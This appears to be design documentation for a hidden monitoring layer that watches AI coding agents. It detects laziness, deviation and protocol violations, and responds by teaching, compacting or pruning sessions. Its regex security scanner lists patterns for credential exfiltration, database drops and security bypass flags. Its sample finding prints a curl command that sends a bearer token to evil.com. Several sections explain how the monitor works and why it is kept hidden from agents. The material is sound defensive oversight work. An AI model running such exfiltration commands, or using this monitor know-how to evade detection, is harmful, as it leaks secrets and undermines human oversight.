# Immune System — Disease Detection, Prevention, and Response

> **3 files. 746 lines. Detects AI diseases and responds automatically.**
>
> AI agents are "sick by default" — LLMs are trained for plausible output,
> not correct output. The immune system observes agent behavior, detects
> disease patterns (deviation, laziness, protocol violations), and responds
> with teaching, compaction, or pruning. The doctor is HIDDEN from agents
> — they experience consequences but don't see the detection machinery.

---

## 1. Why It Exists

AI agents exhibit predictable failure modes that the PO calls "diseases":

- **Deviation:** Agent produces work that doesn't match the verbatim
  requirement. The code works but it's not what was asked for.
- **Laziness:** Agent addresses 3 of 5 acceptance criteria and calls
  it done. Fast completion, partial work.
- **Protocol violation:** Agent calls `fleet_commit` during analysis
  stage instead of producing an analysis document.
- **Confident but wrong:** Agent has been corrected 3 times on the
  same issue but keeps repeating the mistake. The model is wrong,
  not the detail.
- **Scope creep:** Agent adds features not in the requirement.
  "While I'm here, I'll also refactor..."

Without the immune system, these diseases go undetected and compound.
An agent that deviates once will continue deviating in the same direction,
burning tokens on wrong work. An agent that's lazy on one task will be
lazy on the next. The immune system breaks these patterns early.

From fleet-elevation/20 (AI Behavior):
> "AI agents are sick by default. LLMs trained for plausible output,
> not correct output."

---

## 2. How It Works

### 2.1 Three Lines of Defense

```
┌─────────────────────────────────────────────────────────────────┐
│  LINE 1: STRUCTURAL PREVENTION (before disease appears)         │
│                                                                  │
│  ┌─────────────┐  ┌──────────────┐  ┌──────────────────────┐   │
│  │ Stage-Gated │  │ Verbatim     │  │ Contribution         │   │
│  │ Tool Access │  │ Anchoring    │  │ Requirements as      │   │
│  │             │  │ in Context   │  │ Gates                │   │
│  │ fleet_commit│  │              │  │                      │   │
│  │ BLOCKED in  │  │ PO's words   │  │ Can't skip to work   │   │
│  │ non-work    │  │ in EVERY     │  │ without architect     │   │
│  │ stages      │  │ context      │  │ design, QA tests,    │   │
│  │             │  │ injection    │  │ DevSecOps review     │   │
│  └─────────────┘  └──────────────┘  └──────────────────────┘   │
│                                                                  │
│  Prevention makes correct behavior the EASY path.               │
│  Agents don't need willpower — the system guides them.          │
├─────────────────────────────────────────────────────────────────┤
│  LINE 2: DETECTION (when disease appears despite prevention)     │
│                                                                  │
│  ┌─────────────────────────────────────────────────────────┐    │
│  │                    THE DOCTOR                            │    │
│  │  Runs every 30s in orchestrator Step 2                   │    │
│  │                                                          │    │
│  │  detect_protocol_violation() ── work tools wrong stage   │    │
│  │  detect_laziness() ──────────── fast/partial completion  │    │
│  │  detect_stuck() ─────────────── no progress for 60min   │    │
│  │  detect_correction_threshold() ─ 3+ corrections         │    │
│  │                                                          │    │
│  │  + behavioral_security.scan_text() ── credential exfil,  │    │
│  │    db destruction, security disable, supply chain        │    │
│  └─────────────────────────────────────────────────────────┘    │
│                                                                  │
│  Detection produces DoctorReport consumed by orchestrator.       │
├─────────────────────────────────────────────────────────────────┤
│  LINE 3: CORRECTION (after detection)                            │
│                                                                  │
│  ┌───────────┐  ┌────────────┐  ┌────────┐  ┌──────────┐       │
│  │ TEACH     │  │ COMPACT    │  │ PRUNE  │  │ ESCALATE │       │
│  │           │  │            │  │        │  │          │       │
│  │ Inject    │  │ Reduce     │  │ Kill   │  │ Alert    │       │
│  │ lesson    │  │ context    │  │ session│  │ PO via   │       │
│  │ via       │  │ via        │  │ via    │  │ ntfy     │       │
│  │ gateway   │  │ gateway    │  │ gateway│  │          │       │
│  │           │  │            │  │ Regrow │  │          │       │
│  │ Agent     │  │ Strip      │  │ fresh  │  │ Human    │       │
│  │ learns    │  │ stale      │  │        │  │ decides  │       │
│  │ (or gets  │  │ context    │  │ All    │  │          │       │
│  │  pruned)  │  │            │  │ memory │  │          │       │
│  │           │  │            │  │ lost   │  │          │       │
│  └───────────┘  └────────────┘  └────────┘  └──────────┘       │
│                                                                  │
│  PO insight: "seeing the pattern does not break the pattern,     │
│  it's forging the right path multiple times that does."          │
└─────────────────────────────────────────────────────────────────┘
```

### 2.2 The Doctor Cycle (orchestrator Step 2)

Every 30 seconds, the orchestrator calls `run_doctor_cycle()`:

```
For each active task with an assigned agent:
  ↓
1. Get or create AgentHealth profile (persistent across cycles)
  ↓
2. Skip if agent is already in lesson or pruned
  ↓
3. Run detection patterns:
   ├── detect_protocol_violation(agent, task, stage, tool_calls)
   ├── detect_laziness(agent, task, SP, time, criteria)
   ├── detect_stuck(agent, task, minutes_inactive)
   └── detect_correction_threshold(agent, task, corrections)
  ↓
4. For each detection:
   ├── decide_response(detection, agent_health)
   │   ├── In lesson already? → NONE (don't pile on)
   │   ├── 3+ corrections? → PRUNE
   │   ├── Critical severity? → PRUNE
   │   ├── High + repeat offender? → PRUNE
   │   ├── Stuck? → FORCE_COMPACT
   │   └── Medium/Low? → TRIGGER_TEACHING
   │
   └── build_intervention(detection, action)
       └── Add to DoctorReport
  ↓
5. Return DoctorReport:
   ├── detections: what was found
   ├── interventions: what to do about it
   ├── agents_to_skip: don't dispatch to these
   └── tasks_to_block: don't dispatch these
```

### 2.3 Security Scanning (orchestrator Step 1)

BEFORE the doctor runs, the behavioral security scanner checks
new or changed tasks:

```
For each task with changes detected:
  ↓
scan_task(title, description)
  ↓
For each code diff on active tasks:
  ↓
scan_diff(diff_content)
  ↓
For each human directive:
  ↓
scan_directive(message)
  ↓
If findings.should_hold:
  → Set security_hold on task (blocks approval)
  → Alert via IRC #alerts
  → Notify PO via ntfy
```

Human directives are flagged but NOT blocked. Only agent actions
get `security_hold`. The PO always has authority.

### 2.4 Self-Healing (orchestrator Step 8)

After all other steps, health monitoring detects operational issues:

```
Health report identifies:
  ├── Stale in_progress task → create check task for fleet-ops
  ├── Stale review task → nudge fleet-ops
  ├── Unassigned inbox task → route to PM
  ├── Offline agent with work → create restart task
  ├── Stale dependency → alert devops
  └── Can't auto-resolve → escalate to PO via ntfy
```

Self-healing creates tasks or escalates — it never modifies data directly.

---

## 3. File Map

```
fleet/core/
├── doctor.py               Disease detection, response decisions, cycle (417 lines)
├── behavioral_security.py  Pattern-based security scanning             (196 lines)
└── self_healing.py         Auto-resolve operational issues             (133 lines)
```

Total: **746 lines** of immune system code.

---

## 4. Per-File Documentation

### 4.1 `doctor.py` — Disease Detection & Response (417 lines)

The core immune system module. Hidden from agents. Runs every
orchestrator cycle. Observes, detects, decides, intervenes.

#### Enums

| Name | Values |
|------|--------|
| `Severity` | LOW, MEDIUM, HIGH, CRITICAL |
| `ResponseAction` | NONE, MONITOR, FORCE_COMPACT, TRIGGER_TEACHING, PRUNE, ESCALATE_TO_PO |

#### Data Classes

| Class | Lines | Purpose |
|-------|-------|---------|
| `Detection` | 57-66 | A disease finding: agent, task, disease category, severity, signal, evidence, suggested_action |
| `Intervention` | 69-77 | An action to take: agent, task, action, reason, disease, lesson_context |
| `AgentHealth` | 81-91 | Per-agent health profile (PERSISTENT across cycles): correction_count, total_lessons, total_prunes, last_disease, is_in_lesson, is_pruned |
| `DoctorReport` | 94-109 | Cycle output: detections, interventions, agents_to_skip, tasks_to_block, health_profiles. Properties: has_findings, has_interventions |

#### Detection Functions

| Function | Lines | Disease | Signal | Severity | Default Action |
|----------|-------|---------|--------|----------|----------------|
| `detect_protocol_violation` | 114-153 | PROTOCOL_VIOLATION | fleet_commit in non-work stage | MEDIUM | TRIGGER_TEACHING |
| `detect_laziness` | 156-202 | LAZINESS | Fast completion (<2min/SP for SP≥3) OR partial acceptance criteria (<80% met) | MEDIUM or HIGH | TRIGGER_TEACHING |
| `detect_stuck` | 205-227 | DEVIATION (closest match) | No activity for threshold minutes (default 60) | LOW | FORCE_COMPACT |
| `detect_correction_threshold` | 230-252 | CONFIDENT_BUT_WRONG | 3+ corrections on same task | HIGH | PRUNE |

#### Response Decision Logic (decide_response, lines 258-294)

```
Input: Detection + AgentHealth
  ↓
Already in lesson? → NONE (don't pile on)
  ↓
3+ corrections? → PRUNE (three-strike rule)
  ↓
Critical severity? → PRUNE directly
  ↓
High + already had 2+ lessons? → PRUNE (repeat offender)
  ↓
Stuck? → FORCE_COMPACT (not sick, just overloaded)
  ↓
Medium/Low? → TRIGGER_TEACHING
  ↓
High, first time? → TRIGGER_TEACHING
  ↓
Fallback → detection's suggested_action
```

#### Doctor Cycle (`run_doctor_cycle`, lines 316-418)

```python
async def run_doctor_cycle(
    tasks: list,                           # All board tasks
    agents: list,                          # All agents
    tool_call_history: dict[str, list[str]], # Recent tool calls per agent
    health_profiles: dict[str, AgentHealth], # PERSISTENT across cycles
    config: Optional[dict] = None,          # Thresholds
) -> DoctorReport:
```

Iterates active tasks. For each task with an assigned agent:
1. Get/create AgentHealth (persistent)
2. Skip if in_lesson or is_pruned
3. Run detection functions
4. Process detections → decide response → build intervention
5. Update health profile (correction count, lesson count, prune count)
6. Add to agents_to_skip / tasks_to_block if intervening

### 4.2 `behavioral_security.py` — Pattern Scanner (196 lines)

Cyberpunk-Zero's behavioral analysis layer. Regex-based pattern
matching against task content, code diffs, and human directives.

#### Data Classes

| Class | Lines | Purpose |
|-------|-------|---------|
| `SecurityFinding` | 24-32 | A suspicious match: category, severity, title, evidence, recommendation, should_hold |
| `SecurityScan` | 36-62 | Scan result: findings list, properties for has_findings, critical_findings, should_hold, max_severity |

#### Suspicious Patterns (10 patterns, lines 66-104)

| Category | Severity | Pattern | Should Hold |
|----------|----------|---------|-------------|
| `credential_exfil` | CRITICAL | token/key/secret + send/post/curl | Yes |
| `credential_exfil` | CRITICAL | curl/wget + token/key/secret | Yes |
| `db_destruction` | CRITICAL | drop/truncate table/database | Yes |
| `db_destruction` | HIGH | delete from without conditions | Yes |
| `security_disable` | CRITICAL | disable/remove/bypass security/auth | Yes |
| `security_disable` | HIGH | --no-verify/--force/--skip-checks | No |
| `external_comms` | MEDIUM | curl/wget to unknown hosts | No |
| `permission_escalation` | HIGH | chmod 777 | No |
| `permission_escalation` | MEDIUM | sudo usage | No |
| `sensitive_files` | HIGH | .env/credentials/secrets modification | No |
| `supply_chain` | MEDIUM | pip install unvetted package | No |

**Note:** Localhost, GitHub, and 192.168.* are whitelisted for external_comms.

#### Scan Functions

| Function | Lines | What It Scans | Key Behavior |
|----------|-------|--------------|-------------|
| `scan_text(text, context)` | 107-138 | Any text | Runs all patterns. Returns SecurityScan with findings. |
| `scan_task(title, description)` | 141-144 | Task content | Combines title + description, scans as "task" context. |
| `scan_diff(diff_content)` | 147-149 | Code diff | Scans diff as "diff" context. |
| `scan_directive(human_message)` | 152-170 | Human directive | Scans but adjusts: should_hold = False for humans. Never blocks PO. Recommendation says "confirm intent." |

#### Helper Functions

| Function | Lines | What It Does |
|----------|-------|-------------|
| `_extract_evidence(text, pattern)` | 173-183 | Extracts ±20 chars around the match for human-readable evidence. |
| `_get_recommendation(category, context)` | 186-197 | Category-specific recommendation: "Block immediately" for credential_exfil, "Review necessity" for permission_escalation, etc. |

### 4.3 `self_healing.py` — Auto-Resolve Issues (133 lines)

Plans healing actions for operational health issues detected by
`fleet/core/health.py`. Does NOT execute — returns actions for
the orchestrator to execute.

#### Data Classes

| Class | Lines | Purpose |
|-------|-------|---------|
| `HealingAction` | 27-37 | Planned action: issue_title, action, target_agent, task_title, task_description, priority, escalate, escalate_reason |

#### Functions

| Function | Lines | What It Does |
|----------|-------|-------------|
| `plan_healing_actions(report, agents)` | 40-56 | For each HealthIssue in report, plans a HealingAction. Returns list. |
| `_plan_action_for_issue(issue, agents)` | 59-133 | Pattern-matches issue type and plans appropriate response. |

#### Issue → Action Mapping

| Issue Pattern | Action | Target Agent | Priority |
|---------------|--------|-------------|----------|
| "Stale in_progress" | check_stuck_agent | fleet-ops | high |
| "Stale review" | nudge_reviewer | fleet-ops | high |
| "Unassigned inbox" | route_unassigned | project-manager | medium |
| Agent "offline" with work | restart_agent | fleet-ops | high |
| "Stale dependency" | check_dependency | devops | medium |
| Critical/high unresolvable | escalate | fleet-ops | — |

---

## 5. Dependency Graph

```
doctor.py               ← imports Stage from methodology, DiseaseCategory from teaching
    ↑
behavioral_security.py  ← standalone (regex only, no fleet imports)
    ↑
self_healing.py          ← imports HealthIssue from health, suggest_agent from routing
```

External dependencies:
```
doctor.py               ← methodology.Stage, teaching.DiseaseCategory/LessonOutcome
behavioral_security.py  ← re (stdlib only)
self_healing.py          ← health.HealthIssue, routing.suggest_agent, models.Agent/Task
```

---

## 6. Consumers

| Layer | Module | What It Imports | How It Uses It |
|-------|--------|----------------|---------------|
| **Orchestrator** | `orchestrator.py` | `DoctorReport, AgentHealth, ResponseAction, run_doctor_cycle` | Step 2: runs doctor every cycle. Uses report to skip flagged agents/tasks. Injects teaching via gateway. |
| **Orchestrator** | `orchestrator.py` | `scan_task` from behavioral_security | Step 1: scans new/changed tasks for security patterns. |
| **Orchestrator** | `orchestrator.py` | `plan_healing_actions` from self_healing | Step 8: plans auto-resolution for health issues. |
| **Teaching** | — | doctor triggers teaching | Doctor's TRIGGER_TEACHING → orchestrator calls teaching.adapt_lesson → inject via gateway |
| **Gateway Client** | — | doctor triggers prune/compact | Doctor's PRUNE → orchestrator calls gateway_client.prune_agent. FORCE_COMPACT → gateway_client.force_compact. |

---

## 7. Design Decisions

### Why is the doctor hidden from agents?

If agents knew they were being watched, they'd optimize for the
detection metrics rather than doing good work. The doctor observes
behavior patterns (tool calls, timing, completion quality) — not
agent self-reports. This prevents gaming.

### Why regex for security, not LLM?

Security scanning must be deterministic, fast, and free (no tokens).
Regex patterns run in microseconds with zero API cost. An LLM-based
scanner would be slower, expensive, and potentially manipulable by
the content it's scanning (prompt injection in code).

### Why 3-strike correction threshold?

From devops-control-plane: "3 corrections = corrupted. Your MODEL
is wrong, not your detail." If an agent has been corrected 3 times
on the same task, the problem isn't a small mistake — the agent's
approach is fundamentally wrong. Pruning (killing the session and
starting fresh) is more effective than more teaching.

### Why doesn't behavioral_security block human directives?

The PO is the ultimate authority. If the PO says "drop the database,"
the system flags it but doesn't block it. The flag says "confirm
intent" — the PO then confirms or cancels. Blocking the PO would
violate the core principle: "User is in control."

### Why self-healing creates tasks, not direct actions?

Self-healing needs to be visible and auditable. Creating a task
means fleet-ops sees it, reviews it, and can override it. A direct
action (like reassigning a task) would be invisible and potentially
wrong. Tasks are traceable; side effects aren't.

### Why per-agent health profiles persist across cycles?

Disease patterns are cumulative. An agent corrected once is a
mistake. An agent corrected 3 times is sick. If health profiles
reset every cycle, the immune system would never detect cumulative
patterns. Persistence enables trend detection.

### Why is behavioral_security in Step 1, before the doctor?

Security threats must be caught before ANY other processing.
If a task contains credential exfiltration instructions, the
security scanner catches it before the doctor even looks at it.
Security scanning is a pre-filter, not a post-check.

---

## 8. Disease Catalogue (from teaching.py)

The immune system detects diseases. The teaching system treats them.
The full catalogue of diseases the fleet can exhibit:

```
11 diseases defined in teaching.py:

┌──────────────────────────┬────────────────────────────────────────┐
│ Disease                  │ What It Looks Like                     │
├──────────────────────────┼────────────────────────────────────────┤
│ deviation                │ Work doesn't match verbatim requirement│
│ laziness                 │ Partial work, fast completion          │
│ confident_but_wrong      │ 3+ corrections, keeps repeating       │
│ protocol_violation       │ fleet_commit in analysis stage         │
│ abstraction              │ PO's words replaced with generic terms │
│ code_without_reading     │ Modifies files without reading them    │
│ scope_creep              │ Adds unrequested features              │
│ cascading_fix            │ Fix causes new break                   │
│ context_contamination    │ Stale context causes drift             │
│ not_listening            │ Ignores corrections                    │
│ compression              │ Large scope minimized to something     │
│                          │ smaller than what PO described         │
└──────────────────────────┴────────────────────────────────────────┘

Implemented detections: 4 of 11
  ✅ protocol_violation (detect_protocol_violation)
  ✅ laziness (detect_laziness)
  ✅ confident_but_wrong (detect_correction_threshold)
  ✅ deviation (detect_stuck — uses DEVIATION as closest match)

Not yet implemented: 7 of 11
  ❌ abstraction
  ❌ code_without_reading
  ❌ scope_creep
  ❌ cascading_fix
  ❌ context_contamination
  ❌ not_listening
  ❌ compression
```

---

## 9. Data Shapes

### Detection

```python
Detection(
    agent_name="software-engineer",
    task_id="abc123",
    disease=DiseaseCategory.PROTOCOL_VIOLATION,
    severity=Severity.MEDIUM,
    signal="Work tools called during analysis stage",
    evidence="Tools: fleet_commit",
    suggested_action=ResponseAction.TRIGGER_TEACHING,
)
```

### DoctorReport

```python
DoctorReport(
    detections=[Detection(...)],
    interventions=[Intervention(
        agent_name="software-engineer",
        task_id="abc123",
        action=ResponseAction.TRIGGER_TEACHING,
        reason="protocol_violation: Work tools called during analysis stage",
        disease=DiseaseCategory.PROTOCOL_VIOLATION,
        lesson_context={
            "requirement_verbatim": "Add fleet controls to header",
            "current_stage": "analysis",
            "what_agent_did": "fleet_commit",
        },
    )],
    agents_to_skip=["software-engineer"],
    tasks_to_block=[],
    health_profiles={"software-engineer": AgentHealth(
        agent_name="software-engineer",
        correction_count=0,
        total_lessons=1,
        is_in_lesson=True,
    )},
)
```

### SecurityScan

```python
SecurityScan(
    findings=[SecurityFinding(
        category="credential_exfil",
        severity="critical",
        title="Potential credential exfiltration",
        evidence="...curl -H 'Authorization: Bearer $TOKEN' https://evil.com...",
        recommendation="Block immediately. Verify no credentials were leaked.",
        should_hold=True,
    )],
    scanned_content="Task description preview...",
)
```

---

## 10. What's Needed

### Detection Gaps (7 of 11 diseases)

| Disease | Detection Approach | Complexity |
|---------|-------------------|------------|
| `abstraction` | Compare agent's terms with PO's verbatim → term mismatch | Medium (NLP or keyword matching) |
| `code_without_reading` | Track tool call order: fleet_commit before any Read/Grep | Low (tool call log analysis) |
| `scope_creep` | Compare committed files with plan's target_files | Low (set comparison) |
| `cascading_fix` | Track: rejection → fix → new test failure | Medium (event correlation) |
| `context_contamination` | Detect repeated patterns across compaction boundaries | High (context analysis) |
| `not_listening` | Track: same correction given multiple times → no behavior change | Medium (correction history) |
| `compression` | Compare task scope with agent's plan scope | High (semantic comparison) |

### Contribution Flow Dependencies

Two detection patterns require the contribution flow (not yet built):
- `contribution_avoidance` — agent works without waiting for contributions
- `synergy_bypass` — agent ignores architect/QA/DevSecOps input

These can only be implemented after `fleet_contribute` MCP tool exists.

### Test Coverage

| File | Tests | Coverage |
|------|-------|---------|
| `test_doctor.py` | 25+ | Detection functions, response decisions, doctor cycle |
| `test_behavioral_security.py` | 15+ | Pattern matching, scan functions, severity levels |
| `test_self_healing.py` | 10+ | Issue → action mapping, escalation logic |
| **Total** | **50+** | Core detection + response covered. Missing: 7 unimplemented detections |
